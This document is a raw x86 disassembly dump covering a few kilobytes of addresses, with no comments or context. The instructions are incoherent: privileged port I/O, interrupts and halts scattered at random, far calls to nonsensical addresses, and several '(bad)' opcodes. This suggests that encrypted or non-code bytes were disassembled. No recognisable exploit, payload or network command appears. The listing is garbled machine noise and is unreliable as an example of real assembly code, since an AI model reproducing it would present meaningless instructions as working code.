  42df46:	or     al,BYTE PTR [esi-0x5c8ef873]
  42df4c:	mov    ah,0x61
  42df4e:	push   es
  42df4f:	into   
  42df50:	or     al,0xe6
  42df52:	out    dx,eax
  42df53:	iret   
  42df54:	add    BYTE PTR [edx+0x561552e5],0xa0
  42df5b:	jge    0x42dfd0
  42df5d:	mov    ds:0x9b6c100d,al
  42df62:	and    DWORD PTR [edi+0x6afd1a11],0x3
  42df69:	aam    0x8e
  42df6b:	scas   eax,DWORD PTR es:[edi]
  42df6c:	cmp    al,0x2
  42df6e:	mov    eax,0x16d80158
  42df73:	mov    dh,0x26
  42df75:	cmp    eax,0x9d546be6
  42df7a:	pop    ss
  42df7b:	or     BYTE PTR [esi-0x58],ah
  42df7e:	pop    ebp
  42df7f:	inc    eax
  42df80:	pop    ss
  42df81:	iret   
  42df82:	add    eax,0x129fb6a3
  42df87:	popa   
  42df88:	test   eax,0xe4af6b6a
  42df8d:	push   ebx
  42df8e:	call   0x8e22c6b6
  42df93:	mov    dh,0x89
  42df95:	pusha  
  42df96:	aaa    
  42df97:	iret   
  42df98:	cmp    BYTE PTR ds:0x1076e162,dh
  42df9e:	shr    DWORD PTR [ebp-0x7d48470e],0xd1
  42dfa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dfa6:	jb     0x42df84
  42dfa8:	fisubr DWORD PTR [eax+0x2]
  42dfab:	hlt    
  42dfac:	ror    BYTE PTR [edi],cl
  42dfae:	out    0xd3,eax
  42dfb0:	cli    
  42dfb1:	stc    
  42dfb2:	outs   dx,BYTE PTR ds:[esi]
  42dfb3:	ins    DWORD PTR es:[edi],dx
  42dfb4:	push   edi
  42dfb5:	adc    al,0xc6
  42dfb7:	cmc    
  42dfb8:	sbb    ah,dh
  42dfba:	push   cs
  42dfbb:	fiadd  DWORD PTR ds:0x809b5513
  42dfc1:	loope  0x42df53
  42dfc3:	add    ch,BYTE PTR [esi]
  42dfc5:	sub    BYTE PTR [esi+0x2f045b8a],0xe4
  42dfcc:	fcomp  DWORD PTR [ebp-0x6d]
  42dfcf:	mov    ds:0x2425828b,eax
  42dfd4:	adc    BYTE PTR [esi+0x55369f48],ch
  42dfda:	jo     0x42e03d
  42dfdc:	xchg   BYTE PTR [ebx+0x39],dh
  42dfdf:	pop    esp
  42dfe0:	ficom  WORD PTR [esi-0x124abbaa]
  42dfe6:	or     bh,dh
  42dfe8:	ffreep st(3)
  42dfea:	es push ds
  42dfec:	or     eax,DWORD PTR [eax+0x2ef0d6e5]
  42dff2:	inc    edi
  42dff3:	test   al,0xc6
  42dff5:	int    0x5a
  42dff7:	cs mov ch,0x85
  42dffa:	mov    al,ds:0x4de8020c
  42dfff:	es jecxz 0x42e053
  42e002:	imul   ecx,DWORD PTR [ebx-0x42087796],0xd60bab0c
  42e00c:	mov    al,ds:0x708052e0
  42e011:	ss mov edi,0x6088eda7
  42e017:	stc    
  42e018:	mov    al,0x0
  42e01a:	hlt    
  42e01b:	push   0xffffffed
  42e01d:	ret    
  42e01e:	or     al,0x40
  42e020:	test   DWORD PTR [edx+0x55],ebp
  42e023:	sti    
  42e024:	add    ch,BYTE PTR [eax+0x5d]
  42e027:	cmc    
  42e028:	mov    BYTE PTR [ebp+eax*1+0xb],cl
  42e02c:	mov    ebx,0x309beaa0
  42e031:	sub    DWORD PTR [esi-0x2],ebx
  42e034:	mov    eax,0x38746ed1
  42e039:	inc    edx
  42e03a:	mov    ss:0x55960e22,al
  42e040:	xor    al,0x76
  42e042:	mov    eax,ds:0x4481806d
  42e047:	dec    esp
  42e048:	and    esp,DWORD PTR ds:0x440b4433
  42e04e:	sub    al,0x6f
  42e050:	mov    bh,0x65
  42e052:	inc    edx
  42e053:	pop    esp
  42e054:	adc    ebp,edx
  42e056:	add    BYTE PTR [ecx+0x12],dl
  42e059:	pop    ebp
  42e05a:	adc    al,0xdd
  42e05c:	sbb    cl,BYTE PTR [ecx-0xb]
  42e05f:	repz cmp cl,BYTE PTR [ebx]
  42e062:	rcr    ebx,1
  42e064:	mov    BYTE PTR es:[ebx],cl
  42e067:	push   0xf
  42e069:	retf   
  42e06a:	jmp    0x42e0c3
  42e06c:	push   eax
  42e06d:	xchg   ebp,eax
  42e06e:	das    
  42e06f:	xchg   BYTE PTR [eax+0x1f63010d],al
  42e075:	push   edx
  42e076:	push   es
  42e077:	jmp    0x528e:0x12c51756
  42e07e:	rcr    BYTE PTR [ecx],1
  42e080:	sub    BYTE PTR [ecx+0x16],bh
  42e083:	mov    dh,0xad
  42e085:	and    eax,eax
  42e087:	cld    
  42e088:	add    bh,BYTE PTR [ebx]
  42e08a:	stos   BYTE PTR es:[edi],al
  42e08b:	inc    eax
  42e08c:	test   DWORD PTR [ebx+0x17111daa],ebp
  42e092:	sub    esi,DWORD PTR [edx+edi*4-0x5d]
  42e096:	je     0x42e08a
  42e098:	mov    bh,0xad
  42e09a:	mov    dh,0xab
  42e09c:	mov    edi,0x64e37aae
  42e0a1:	bound  ebx,QWORD PTR [ebx+0x55a94262]
  42e0a7:	sbb    eax,0xdf581304
  42e0ac:	xor    ah,BYTE PTR [ebx]
  42e0ae:	fiadd  DWORD PTR ds:0xa22a1171
  42e0b4:	inc    ecx
  42e0b5:	rcr    DWORD PTR [ebx],1
  42e0b7:	ins    DWORD PTR es:[edi],dx
  42e0b8:	sbb    esi,DWORD PTR [edi+0x17d66db6]
  42e0be:	jmp    0x9cdfd45f
  42e0c3:	sahf   
  42e0c4:	clc    
  42e0c5:	inc    edx
  42e0c6:	inc    edi
  42e0c7:	shr    DWORD PTR [ebp-0x15f6ace],1
  42e0cd:	sbb    DWORD PTR [eax-0x775e4fae],edi
  42e0d3:	in     eax,dx
  42e0d4:	mov    cl,dh
  42e0d6:	or     edx,DWORD PTR [edx-0x49563569]
  42e0dc:	xor    eax,0xc1afb045
  42e0e1:	dec    ebp
  42e0e2:	les    edx,FWORD PTR [esp+ecx*8]
  42e0e5:	push   cs
  42e0e6:	fisubr DWORD PTR [esi+0x6c]
  42e0e9:	fild   DWORD PTR [ebx+eiz*8]
  42e0ec:	aas    
  42e0ed:	pop    ecx
  42e0ee:	cdq    
  42e0ef:	int3   
  42e0f0:	pusha  
  42e0f1:	cmc    
  42e0f2:	sti    
  42e0f3:	lds    edx,FWORD PTR [ebp+0x5d]
  42e0f6:	mov    al,0x8b
  42e0f8:	iret   
  42e0f9:	les    esp,FWORD PTR [ecx+0x70]
  42e0fc:	adc    bl,BYTE PTR [eax+ebp*2-0x23]
  42e100:	pop    edx
  42e101:	xor    DWORD PTR [esi-0x11c2d8f4],ebx
  42e107:	jle    0x42e15b
  42e109:	pop    ebx
  42e10a:	lods   eax,DWORD PTR ds:[esi]
  42e10b:	dec    ebp
  42e10c:	add    BYTE PTR [eax],dl
  42e10e:	mov    al,ds:0x3885f7a6
  42e113:	mov    bh,0xae
  42e115:	test   al,0xb6
  42e117:	js     0x42e166
  42e119:	ret    
  42e11a:	sbb    DWORD PTR [ebx-0x7a1a2add],ebp
  42e120:	adc    al,ch
  42e122:	push   edi
  42e123:	or     ecx,DWORD PTR [edi+0x44]
  42e126:	xor    al,0x80
  42e128:	fcom   DWORD PTR [ecx+eax*8]
  42e12b:	ds dec edi
  42e12d:	retf   
  42e12e:	push   esp
  42e12f:	xchg   ch,al
  42e131:	inc    edx
  42e132:	sub    edx,0x59
  42e135:	cmp    eax,edx
  42e137:	pop    eax
  42e138:	aaa    
  42e139:	outs   dx,BYTE PTR ds:[esi]
  42e13a:	sbb    ebx,DWORD PTR ds:0x1bc2e4d0
  42e140:	or     al,BYTE PTR [esi]
  42e142:	call   0x288e:0xda22260e
  42e149:	pop    eax
  42e14a:	jp     0x42e0e7
  42e14c:	mov    BYTE PTR [edi],cl
  42e14e:	jge    0x42e1c0
  42e150:	(bad)  [esi+0x65871805]
  42e156:	add    al,0x4d
  42e158:	sub    DWORD PTR [esi+0x40138c10],ebx
  42e15e:	mov    bh,0xad
  42e160:	or     eax,0xaf835c86
  42e165:	sub    DWORD PTR [ebx],eax
  42e167:	add    dh,BYTE PTR [esi-0x324c9253]
  42e16d:	push   cs
  42e16e:	test   al,0xd9
  42e170:	sub    edi,DWORD PTR [edi-0x522bbcea]
  42e176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e177:	les    ebx,FWORD PTR [eax-0x3f]
  42e17a:	xor    al,0x1d
  42e17c:	jnp    0x42e1de
  42e17e:	mov    ebx,0x8c5b41b0
  42e183:	in     al,dx
  42e184:	jl     0x42e112
  42e186:	pop    ecx
  42e187:	cmp    edx,edx
  42e189:	fidiv  DWORD PTR [esi-0x55]
  42e18c:	add    ebx,DWORD PTR [edx+0x6f]
  42e18f:	jl     0x42e1b6
  42e191:	jbe    0x42e1ad
  42e193:	lods   eax,DWORD PTR ds:[esi]
  42e194:	push   esi
  42e195:	ins    DWORD PTR es:[edi],dx
  42e196:	pop    es
  42e197:	adc    BYTE PTR [edi+0x18a448cb],dl
  42e19d:	xor    ch,cl
  42e19f:	xor    eax,0x1b1b6db5
  42e1a4:	inc    edx
  42e1a5:	out    dx,al
  42e1a6:	pop    edx
  42e1a7:	push   ecx
  42e1a8:	retf   
  42e1a9:	mov    eax,ds:0xd05a1450
  42e1ae:	mov    dl,BYTE PTR [edx]
  42e1b0:	jg     0x42e166
  42e1b2:	cs fwait
  42e1b4:	push   0x2dcb6a3
  42e1b9:	adc    eax,0x90417e17
  42e1be:	mov    al,bl
  42e1c0:	inc    eax
  42e1c1:	add    DWORD PTR [edi+ecx*1],eax
  42e1c4:	imul   ebp,DWORD PTR [ebp+0xb],0x5
  42e1c8:	call   0x86042279
  42e1cd:	ss jge 0x42e243
  42e1d0:	push   ebp
  42e1d1:	les    ebp,FWORD PTR [ebp-0x45c1c0fc]
  42e1d7:	test   BYTE PTR [ebx*2+0x576adade],dl
  42e1de:	rol    BYTE PTR [ebx+eiz*1],0x0
  42e1e2:	xlat   BYTE PTR ds:[ebx]
  42e1e3:	ins    DWORD PTR es:[edi],dx
  42e1e4:	sub    al,BYTE PTR [ebp-0x4c]
  42e1e7:	adc    eax,0xc2719234
  42e1ec:	das    
  42e1ed:	les    ecx,FWORD PTR [esi]
  42e1ef:	sub    dh,BYTE PTR [esi+0x30]
  42e1f2:	xor    al,BYTE PTR es:[ebp+eax*4-0x45291f65]
  42e1fa:	xor    eax,0x811a0e78
  42e1ff:	fistp  WORD PTR [eax+0x65]
  42e202:	lds    esi,FWORD PTR [eax-0x797a3bf3]
  42e208:	sub    ebp,edi
  42e20a:	mov    al,ds:0xc710f339
  42e20f:	sbb    ch,BYTE PTR [edx]
  42e211:	fidiv  DWORD PTR [esi-0x7c48d3b9]
  42e217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e218:	test   edi,esp
  42e21a:	(bad)  [esi+0x5fa919b5]
  42e220:	cmp    BYTE PTR [ecx-0x1a],cl
  42e223:	jno    0x42e219
  42e225:	and    DWORD PTR [esi+0x55],0xffffffb7
  42e229:	push   es
  42e22a:	and    ah,0xd4
  42e22d:	or     DWORD PTR [eax],edi
  42e22f:	xor    BYTE PTR [esi],bl
  42e231:	mov    ah,0xdb
  42e233:	inc    edx
  42e234:	push   edi
  42e235:	push   esi
  42e236:	fidivr DWORD PTR [edx]
  42e238:	sub    bl,BYTE PTR [ecx+edx*1-0x7e]
  42e23c:	adc    al,0x3b
  42e23e:	add    bl,al
  42e240:	cs cli 
  42e242:	jmp    0x42e260
  42e244:	inc    ecx
  42e245:	sbb    DWORD PTR [ebp-0x15],edx
  42e248:	sbb    eax,DWORD PTR [esi-0x61aba280]
  42e24e:	mov    DWORD PTR [ebx+0x60],esp
  42e251:	and    ebx,edx
  42e253:	push   ecx
  42e254:	rcr    DWORD PTR [edx-0x5a],0x1c
  42e258:	pop    edi
  42e259:	xor    eax,0xada0ba5d
  42e25e:	stos   DWORD PTR es:[edi],eax
  42e25f:	xor    eax,0x967144ca
  42e264:	and    esp,eax
  42e266:	jbe    0x42e268
  42e268:	ins    BYTE PTR es:[edi],dx
  42e269:	mov    bh,0xe8
  42e26b:	cs daa 
  42e26d:	or     BYTE PTR [edi+ebp*2],dh
  42e270:	push   ecx
  42e271:	pop    ecx
  42e272:	push   esp
  42e273:	mov    al,0x9
  42e275:	add    BYTE PTR [edi+0x16ad233d],bh
  42e27b:	mov    al,0xd4
  42e27d:	sbb    bl,BYTE PTR [edx]
  42e27f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e280:	jle    0x42e2c1
  42e282:	scas   eax,DWORD PTR es:[edi]
  42e283:	adc    esi,DWORD PTR [edi+0xd68d8d]
  42e289:	pop    esi
  42e28a:	sbb    bl,al
  42e28c:	sbb    eax,0x5d49de7f
  42e291:	push   0xc4d48897
  42e296:	in     al,dx
  42e297:	or     BYTE PTR [ebp+ecx*2+0x61],cl
  42e29b:	mov    bh,0x87
  42e29d:	pop    ebx
  42e29e:	inc    edi
  42e29f:	aas    
  42e2a0:	popf   
  42e2a1:	ds icebp 
  42e2a3:	cmp    DWORD PTR [eax-0x38f1a36f],ecx
  42e2a9:	add    al,dl
  42e2ab:	adc    DWORD PTR [ecx],eax
  42e2ad:	push   edx
  42e2ae:	cmp    eax,0x2b6da5c6
  42e2b3:	stos   DWORD PTR es:[edi],eax
  42e2b4:	imul   esp,DWORD PTR [ecx],0xffffff98
  42e2b7:	ror    bl,0x9a
  42e2ba:	fimul  DWORD PTR [esi+0x42]
  42e2bd:	push   ebx
  42e2be:	rol    BYTE PTR [ebp-0x7c9a00cc],1
  42e2c4:	pop    edi
  42e2c5:	mov    eax,0xedb42eda
  42e2ca:	aad    0xf0
  42e2cc:	je     0x42e27f
  42e2ce:	sub    DWORD PTR ds:0xc517a392,edi
  42e2d4:	pop    ebp
  42e2d5:	adc    eax,0xa896289b
  42e2da:	push   esp
  42e2db:	ins    BYTE PTR es:[edi],dx
  42e2dc:	les    edx,FWORD PTR [edi+esi*1]
  42e2df:	fisub  DWORD PTR [edi+0x17071731]
  42e2e5:	mov    WORD PTR [edx],gs
  42e2e7:	in     eax,0x5c
  42e2e9:	adc    eax,0xac135b6d
  42e2ee:	call   0xa0b6:0xa632293e
  42e2f5:	mov    dh,0x6d
  42e2f7:	xor    eax,0xeff65f32
  42e2fc:	mov    esp,0x5b82aa5d
  42e301:	(bad)  [esi]
  42e303:	out    dx,eax
  42e304:	aam    0x5f
  42e306:	pusha  
  42e307:	push   ebp
  42e308:	shr    BYTE PTR [ebp-0x25],cl
  42e30b:	call   0x5e1b4caa
  42e310:	clc    
  42e311:	aad    0x9b
  42e313:	pop    edi
  42e314:	jl     0x42e2c0
  42e316:	add    bl,al
  42e318:	push   ecx
  42e319:	aam    0xd9
  42e31b:	sub    ecx,ecx
  42e31d:	retf   0x16da
  42e320:	test   al,0xe
  42e322:	call   0x572a0153
  42e327:	pop    esp
  42e328:	or     dl,BYTE PTR [edi]
  42e32a:	call   0x69b8af51
  42e32f:	sar    DWORD PTR [edi],cl
  42e331:	pop    esi
  42e332:	dec    ebx
  42e333:	pop    ebp
  42e334:	add    BYTE PTR [edi+0x5efb3c6d],dh
  42e33a:	cmp    al,0x8
  42e33c:	sbb    al,0x61
  42e33e:	imul   ebp,DWORD PTR [eax+eax*1],0x33
  42e342:	mov    eax,0x404f0575
  42e347:	pop    ebx
  42e348:	push   ss
  42e349:	push   0x9e20bc68
  42e34e:	or     al,0x59
  42e350:	enter  0xa37d,0xea
  42e354:	mov    BYTE PTR [edx+0x7],0xa4
  42e358:	leave  
  42e359:	fnstenv [ebx]
  42e35b:	aad    0x75
  42e35d:	xor    eax,0xd401b405
  42e362:	inc    esp
  42e363:	je     0x42e2f9
  42e365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e366:	sub    BYTE PTR [eax-0x55],ch
  42e369:	mov    al,ds:0xa534c2
  42e36e:	fadd   DWORD PTR [ebp+0x6d]
  42e371:	mov    al,0x50
  42e373:	imul   eax,eax,0xffffffd6
  42e376:	in     eax,0x41
  42e378:	push   edi
  42e379:	add    eax,0xd28b616c
  42e37e:	aas    
  42e37f:	or     DWORD PTR [eax+0x454b010d],0xffffffdf
  42e386:	sbb    BYTE PTR [eax],bh
  42e388:	test   al,al
  42e38a:	test   DWORD PTR [ebp-0x159a99fa],ecx
  42e390:	dec    ebx
  42e391:	adc    ch,bh
  42e393:	sub    al,0x50
  42e395:	mov    ebx,0x8296b5f1
  42e39a:	popf   
  42e39b:	mov    ecx,0xe6d6293
  42e3a0:	mov    edx,0x7306c0bc
  42e3a5:	jno    0x42e38b
  42e3a7:	jo     0x42e3a9
  42e3a9:	mov    ebp,0xdc00f448
  42e3ae:	call   0x2c95:0x5fb4a380
  42e3b5:	mov    dh,0xe
  42e3b7:	mov    eax,0x8ad6c75
  42e3bc:	call   0x6c00cad2
  42e3c1:	and    DWORD PTR [eax+ebp*1-0x66],ebp
  42e3c5:	fcmovu st,st(2)
  42e3c7:	sbb    cl,BYTE PTR [edi]
  42e3c9:	jne    0x42e422
  42e3cb:	mov    dl,0x49
  42e3cd:	inc    esi
  42e3ce:	aad    0x76
  42e3d0:	adc    BYTE PTR [edx],cl
  42e3d2:	test   al,0x8d
  42e3d4:	bound  esi,QWORD PTR [edx-0x48fbaca0]
  42e3da:	mov    ecx,0x3b0b8539
  42e3df:	rcr    DWORD PTR [eax+0x58],1
  42e3e2:	push   0xfd6a8888
  42e3e7:	inc    eax
  42e3e8:	pop    es
  42e3e9:	cmp    cl,BYTE PTR [esi]
  42e3eb:	or     BYTE PTR [edi-0x23],0x0
  42e3ef:	or     eax,0x2c3a81e3
  42e3f4:	cmp    DWORD PTR ds:0xbdb6d01,ecx
  42e3fa:	icebp  
  42e3fb:	push   cs
  42e3fc:	outs   dx,DWORD PTR ds:[esi]
  42e3fd:	jno    0x42e441
  42e3ff:	addr16 sti 
  42e401:	aad    0x27
  42e403:	cs mov ah,0x83
  42e406:	mov    dh,0xdf
  42e408:	loope  0x42e3bd
  42e40a:	rol    DWORD PTR [eax-0x492557d9],cl
  42e410:	dec    ebp
  42e411:	mov    ds:0x1a38c017,al
  42e416:	loopne 0x42e44c
  42e418:	jne    0x42e46e
  42e41a:	jne    0x42e407
  42e41c:	xor    BYTE PTR [edi-0x53],al
  42e41f:	adc    BYTE PTR ds:0xa360217c,dh
  42e425:	or     edi,DWORD PTR [eax-0x78577056]
  42e42b:	xor    al,0x21
  42e42d:	dec    edi
  42e42e:	in     eax,dx
  42e42f:	add    BYTE PTR [edx-0x503239a0],bh
  42e435:	push   cs
  42e436:	and    eax,0xd0b8daf7
  42e43b:	adc    DWORD PTR ss:[esi],ebp
  42e43e:	push   ebp
  42e43f:	call   0x4fff725e
  42e444:	push   esp
  42e445:	les    ecx,FWORD PTR [esi]
  42e447:	add    bl,BYTE PTR [ebp-0x124f763a]
  42e44d:	sub    bl,dl
  42e44f:	push   ebx
  42e450:	addr16 js 0x42e40c
  42e453:	fdiv   QWORD PTR [ecx-0x2917d6fe]
  42e459:	push   esi
  42e45a:	pop    es
  42e45b:	xor    ch,BYTE PTR [ebx-0x18]
  42e45e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e45f:	fbld   TBYTE PTR [esi]
  42e461:	fld    TBYTE PTR [ebp+0x18]
  42e464:	fidivr DWORD PTR [edx-0x51a97a7a]
  42e46a:	dec    edx
  42e46b:	xor    BYTE PTR [edx+0x3],dl
  42e46e:	push   eax
  42e46f:	dec    ebx
  42e470:	push   ebp
  42e471:	mov    bh,0x2f
  42e473:	dec    esi
  42e474:	lea    esp,[esi]
  42e476:	stos   BYTE PTR es:[edi],al
  42e477:	ins    DWORD PTR es:[edi],dx
  42e478:	xor    DWORD PTR [eax+0x1e48ea17],0xffffffe7
  42e47f:	lods   eax,DWORD PTR ds:[esi]
  42e480:	mov    eax,edx
  42e482:	shl    BYTE PTR [ebx-0x47],cl
  42e485:	fwait
  42e486:	mov    eax,DWORD PTR [esi-0x22]
  42e489:	sahf   
  42e48a:	mov    DWORD PTR [ebp+0x430b8806],ebp
  42e490:	push   ecx
  42e491:	in     al,0x57
  42e493:	rol    DWORD PTR [esi-0x4a],0x80
  42e497:	or     dh,BYTE PTR [edi-0x1e615e82]
  42e49d:	xor    DWORD PTR [ecx],ebp
  42e49f:	mov    esi,0xaeda25b
  42e4a4:	das    
  42e4a5:	ja     0x42e4c0
  42e4a7:	ja     0x42e43a
  42e4a9:	or     BYTE PTR [edx+0x4b],ah
  42e4ac:	retf   
  42e4ad:	fld    TBYTE PTR [ebp-0x74]
  42e4b0:	xlat   BYTE PTR ds:[ebx]
  42e4b1:	vpcomuw xmm0,xmm6,XMMWORD PTR [eax],0xaa
  42e4b7:	ss pop edi
  42e4b9:	imul   edx,DWORD PTR [ebp-0x52],0x90370baa
  42e4c0:	lock add DWORD PTR [eax-0x42d29348],esp
  42e4c7:	push   ebp
  42e4c8:	mov    esi,0x45fe371e
  42e4cd:	sbb    eax,0x5f443b50
  42e4d2:	repnz mov ebp,0x70103651
  42e4d8:	sub    edx,DWORD PTR [ecx]
  42e4da:	mov    DWORD PTR [ecx+0x41034956],ebx
  42e4e0:	pusha  
  42e4e1:	pop    edx
  42e4e2:	call   0xe001f9e9
  42e4e7:	test   BYTE PTR [eax+esi*4+0x4fb0ba23],ah
  42e4ee:	shl    DWORD PTR [ebp-0x4eba834a],1
  42e4f4:	fisubr WORD PTR [ebx+ebx*2+0xd]
  42e4f8:	inc    ebp
  42e4f9:	mov    WORD PTR [edi+0x65ef429a],?
  42e4ff:	je     0x42e502
  42e501:	sub    al,0x5
  42e503:	call   0x4a6eefe9
  42e508:	dec    ebx
  42e509:	dec    ebp
  42e50a:	sub    al,0x7
  42e50c:	enter  0x5740,0x11
  42e510:	jg     0x42e54a
  42e512:	add    dl,BYTE PTR [esi]
  42e514:	and    BYTE PTR [esi],dh
  42e516:	cdq    
  42e517:	sbb    edi,DWORD PTR [ebx+0x2]
  42e51a:	ss mov dh,0xad
  42e51d:	mov    ds:0x91e9e302,eax
  42e522:	inc    BYTE PTR [ebp-0x3a]
  42e525:	xchg   edi,eax
  42e526:	fdiv   DWORD PTR [esi+0x5a74db6d]
  42e52c:	cmp    BYTE PTR [eax],0x9b
  42e52f:	jno    0x42e548
  42e531:	dec    BYTE PTR [edx+0x5e]
  42e534:	push   edi
  42e535:	pop    esp
  42e536:	push   0x96eccdc
  42e53b:	rol    BYTE PTR [ebp-0x2f33edff],cl
  42e541:	int    0xb5
  42e543:	pop    ebx
  42e544:	arpl   WORD PTR [edi+0x3a],bx
  42e547:	xor    bl,BYTE PTR ds:0x41b46ef8
  42e54d:	jne    0x42e4ff
  42e54f:	mov    ch,0x35
  42e551:	sti    
  42e552:	pushf  
  42e553:	stos   BYTE PTR es:[edi],al
  42e554:	dec    ecx
  42e555:	mov    ebx,0xdd15dad8
  42e55a:	sbb    al,BYTE PTR [ebx+edx*2-0x38]
  42e55e:	fisttp QWORD PTR [ebx+0x41b1714a]
  42e564:	xchg   edi,eax
  42e565:	ins    DWORD PTR es:[edi],dx
  42e566:	mov    eax,ds:0xb09a5289
  42e56b:	adc    DWORD PTR [ebx-0x16],ebp
  42e56e:	push   cs
  42e56f:	sub    ch,BYTE PTR [esi]
  42e571:	xor    al,0x27
  42e573:	jle    0x42e539
  42e575:	sub    dh,BYTE PTR [ebp-0x7]
  42e578:	je     0x42e5db
  42e57a:	fcmovnu st,st(2)
  42e57c:	sti    
  42e57d:	cld    
  42e57e:	adc    al,0x80
  42e580:	ja     0x42e544
  42e582:	mov    esi,0x28a25b16
  42e587:	(bad)  
  42e588:	fist   DWORD PTR [eax+0x74]
  42e58b:	rcr    BYTE PTR [esi-0x1d],1
  42e58e:	jo     0x42e5c6
  42e590:	adc    ah,bl
  42e592:	call   0x8815710f
  42e597:	hlt    
  42e598:	pop    esp
  42e599:	xchg   edi,eax
  42e59a:	test   eax,0xa3b11d0
  42e59f:	mov    ebp,0xe08f91b7
  42e5a4:	mov    al,ds:0x146e82ed
  42e5a9:	lock lods al,BYTE PTR ds:[esi]
  42e5ab:	ds popa 
  42e5ad:	cmc    
  42e5ae:	mov    DWORD PTR [eax+0x7c],edx
  42e5b1:	loop   0x42e619
  42e5b3:	pop    ebp
  42e5b4:	into   
  42e5b5:	inc    ecx
  42e5b6:	xor    eax,0xa8f71c97
  42e5bb:	mov    cs,WORD PTR [eax-0x19214b8a]
  42e5c1:	jge    0x42e5bd
  42e5c3:	ror    BYTE PTR [esi],cl
  42e5c5:	add    BYTE PTR ds:0xf0197188,0x8a
  42e5cc:	xchg   edx,eax
  42e5cd:	pop    eax
  42e5ce:	pop    esi
  42e5cf:	cli    
  42e5d0:	rcl    dl,0x9f
  42e5d3:	leave  
  42e5d4:	adc    edx,DWORD PTR [edx+0x7f6e00ff]
  42e5da:	add    dh,BYTE PTR [esp+eax*2-0x23]
  42e5de:	fimul  WORD PTR [eax+0x754d7b3]
  42e5e4:	(bad)  
  42e5e5:	fist   DWORD PTR [ebx-0x25]
  42e5e8:	sub    al,0x4d
  42e5ea:	cmp    al,0xea
  42e5ec:	sub    eax,0xe131d032
  42e5f1:	push   ecx
  42e5f2:	aaa    
  42e5f3:	fcmovbe st,st(2)
  42e5f5:	ins    DWORD PTR es:[edi],dx
  42e5f6:	cmp    BYTE PTR [esi+0xb7ebc6f],dh
  42e5fc:	mov    bh,0x5c
  42e5fe:	ficomp DWORD PTR [ebp+esi*1+0x19]
  42e602:	cmp    bh,dl
  42e604:	or     esp,DWORD PTR [edx-0x23]
  42e607:	sar    BYTE PTR ds:[edx-0x63feb293],1
  42e60e:	in     al,0x9b
  42e610:	add    al,0x2c
  42e612:	inc    edi
  42e613:	ins    DWORD PTR es:[edi],dx
  42e614:	outs   dx,BYTE PTR ds:[esi]
  42e615:	dec    ebx
  42e616:	xchg   esp,eax
  42e617:	test   eax,0xd797facc
  42e61c:	and    ch,BYTE PTR [edx+eiz*1]
  42e61f:	call   0x1539416a
  42e624:	xchg   esi,eax
  42e625:	stos   DWORD PTR es:[edi],eax
  42e626:	and    eax,0xeadc50da
  42e62b:	adc    DWORD PTR [ebx-0x215a4312],0x5da8b3c3
  42e635:	mov    al,0x21
  42e637:	fild   QWORD PTR [edx+eiz*1+0x4]
  42e63b:	repnz sub dl,BYTE PTR [esi+0x17]
  42e63f:	push   eax
  42e640:	cmp    esp,DWORD PTR [edx+0x70]
  42e643:	jge    0x42e623
  42e645:	xchg   esi,eax
  42e646:	add    al,0x68
  42e648:	stos   BYTE PTR es:[edi],al
  42e649:	ins    DWORD PTR es:[edi],dx
  42e64a:	loope  0x42e62b
  42e64c:	cli    
  42e64d:	jg     0x42e6a2
  42e64f:	xchg   edx,eax
  42e650:	sbb    ecx,DWORD PTR [esi]
  42e652:	pop    edi
  42e653:	push   ss
  42e654:	mov    ch,0xb5
  42e656:	test   DWORD PTR [ebp+0x39],eax
  42e659:	and    BYTE PTR [ebp+0x5e],bh
  42e65c:	jb     0x42e5f4
  42e65e:	fcmovbe st,st(6)
  42e660:	test   DWORD PTR ds:0x3ec126ae,edi
  42e666:	pop    ss
  42e667:	aam    0xeb
  42e669:	sub    al,0x40
  42e66b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e66c:	fdivr  DWORD PTR [ebx]
  42e66e:	mov    esp,0xf9d58655
  42e673:	mov    dh,0xd0
  42e675:	add    eax,0x2322a066
  42e67a:	xlat   BYTE PTR ds:[ebx]
  42e67b:	and    DWORD PTR [edi+0xaa92f00],eax
  42e681:	xchg   esi,eax
  42e682:	pusha  
  42e683:	rcl    BYTE PTR [ebp-0x49df3dd4],1
  42e689:	jbe    0x42e62e
  42e68b:	xchg   DWORD PTR [ebx],ebx
  42e68d:	pop    ebx
  42e68e:	fwait
  42e68f:	xchg   edx,eax
  42e690:	mov    DWORD PTR [esi-0x293f3555],edi
  42e696:	nop
  42e697:	mov    DWORD PTR es:[ebx+0x1c],edi
  42e69b:	mov    dh,0xd0
  42e69d:	add    bl,BYTE PTR [ebx-0x14]
  42e6a0:	loopne 0x42e6c6
  42e6a2:	bswap  ebx
  42e6a4:	push   ss
  42e6a5:	inc    ecx
  42e6a6:	loopne 0x42e67e
  42e6a8:	mov    dh,0xed
  42e6aa:	mov    cl,0x2
  42e6ac:	ds mov ah,0x50
  42e6af:	push   ebp
  42e6b0:	mov    edi,edx
  42e6b2:	cwde   
  42e6b3:	add    al,0x50
  42e6b5:	je     0x42e65a
  42e6b7:	jge    0x42e716
  42e6b9:	lea    ecx,[edi-0x50]
  42e6bc:	jb     0x42e725
  42e6be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6bf:	jmp    0x8528:0xc4742db6
  42e6c6:	jbe    0x42e6f7
  42e6c8:	mov    esi,0x694fda2c
  42e6cd:	popa   
  42e6ce:	jmp    0x42e658
  42e6d0:	xor    edx,DWORD PTR [ecx+ecx*4-0x28e71d0d]
  42e6d7:	adc    edx,DWORD PTR ds:0x8af47f97
  42e6dd:	add    BYTE PTR [ebx-0x3902ff3f],bl
  42e6e3:	push   cs
  42e6e4:	push   esi
  42e6e5:	ror    DWORD PTR ds:0x42c554be,0xa9
  42e6ec:	xchg   edi,eax
  42e6ed:	add    cl,ch
  42e6ef:	outs   dx,BYTE PTR ds:[esi]
  42e6f0:	or     ch,bh
  42e6f2:	mov    al,0xb1
  42e6f4:	xor    eax,0x92a99b00
  42e6f9:	pop    edi
  42e6fa:	jle    0x42e699
  42e6fc:	shr    BYTE PTR [ecx-0x75d5d200],cl
  42e702:	sbb    BYTE PTR [ebp+0x2f],cl
  42e705:	test   eax,0xe7c6c2e0
